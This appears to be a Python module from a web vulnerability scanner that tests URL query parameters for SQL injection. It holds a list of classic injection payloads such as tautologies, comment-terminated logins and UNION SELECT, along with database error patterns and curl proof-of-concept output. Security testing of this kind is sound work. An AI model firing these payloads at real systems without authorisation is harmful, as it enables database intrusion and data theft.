"""
SQL Injection Detection Module
OWASP A03:2021 - Injection
"""

import requests
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.payload_loader import payload_loader


class SQLiModule:
    def __init__(self, target_url: str, custom_payloads: List[str] = None, http_client: Any = None):
        self.target_url = target_url
        self.findings = []
        
        # Inject custom HttpClient if provided, otherwise default to basic requests mockup
        if http_client:
            self.http = http_client
        else:
            import requests as r
            self.http = r

        # Default SQL injection payloads
        default_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
        ]
        
        # Merge with custom payloads if provided
        self.payloads = payload_loader.merge_with_defaults(
            default_payloads,
            custom_payloads or ['sqli.txt']  # Load from file by default
        )
        
        # Error-based detection patterns
        self.error_patterns = [
            "SQL syntax",
            "mysql_fetch",
            "ORA-",
            "PostgreSQL",
            "SQLite",
            "ODBC",
            "JET Database",
            "Microsoft Access",
        ]
        
    def test_parameter(self, url: str, param: str, value: str) -> List[Dict[str, Any]]:
        """Test a single parameter for SQL injection"""
        findings = []
        
        try:
            # Get baseline response
            baseline_response = self.http.get(url, timeout=5)
            baseline_length = len(baseline_response.text)
            
            for payload in self.payloads:
                # Build test URL
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                
                # Send request
                response = self.http.get(test_url, timeout=5)
                
                # Check for error-based SQLi
                for pattern in self.error_patterns:
                    if pattern.lower() in response.text.lower():
                        findings.append({
                            "name": "SQL Injection (Error-based)",
                            "severity": "critical",
                            "owasp_category": "A03:2021",
                            "url": url,
                            "parameter": param,
                            "confidence": 95,
                            "technique": "Error-based",
                            "evidence": {
                                "payload": payload,
                                "error_pattern": pattern,
                                "response_snippet": response.text[:200]
                            },
                            "poc": f"curl -X GET \"{test_url}\"",
                            "remediation": "Use parameterized queries or prepared statements"
                        })
                        break
                
                # Check for boolean-based SQLi
                if "' AND '1'='1" in payload or "' OR '1'='1" in payload:
                    response_length = len(response.text)
                    if abs(response_length - baseline_length) > 100:
                        findings.append({
                            "name": "SQL Injection (Boolean-based)",
                            "severity": "critical",
                            "owasp_category": "A03:2021",
                            "url": url,
                            "parameter": param,
                            "confidence": 85,
                            "technique": "Boolean-based blind",
                            "evidence": {
                                "payload": payload,
                                "baseline_length": baseline_length,
                                "response_length": response_length
                            },
                            "poc": f"curl -X GET \"{test_url}\"",
                            "remediation": "Use parameterized queries or prepared statements"
                        })
                        
        except Exception as e:
            print(f"Error testing parameter {param}: {str(e)}")
            
        return findings
        
    def scan(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Scan URLs for SQL injection vulnerabilities"""
        all_findings = []
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param, values in params.items():
                findings = self.test_parameter(url, param, values[0] if values else '')
                all_findings.extend(findings)
                
        return all_findings
